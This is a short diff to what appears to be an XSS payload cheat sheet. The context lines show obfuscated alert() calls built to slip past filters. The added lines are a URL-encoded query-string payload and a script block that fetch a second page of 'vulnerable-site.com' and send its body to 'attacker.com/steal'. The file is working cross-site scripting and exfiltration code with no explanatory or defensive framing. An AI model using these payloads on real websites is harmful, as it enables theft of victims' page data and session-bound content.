@@ -2,3 +2,12 @@
 - window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
 - document['default'+'View'][`\u0061lert`](3)
 - this.ownerDocument.defaultView['\u0061lert'](4)
+
+
+https://vulnerable-site.com/page1?param1=fetch('https%3A%2F%2Fvulnerable-site.com%2Fpage2').then(response%20%3D%3E%20response.text()).then(body%20%3D%3E%20fetch('https%3A%2F%2Fattacker.com%2Fsteal%3Fdata%3D'%20%2B%20encodeURIComponent(body)));
+
+<script>
+fetch('https://vulnerable-site.com/page2')
+  .then(response => response.text())
+  .then(body => fetch('https://attacker.com/steal?data=' + encodeURIComponent(body)));
+</script>
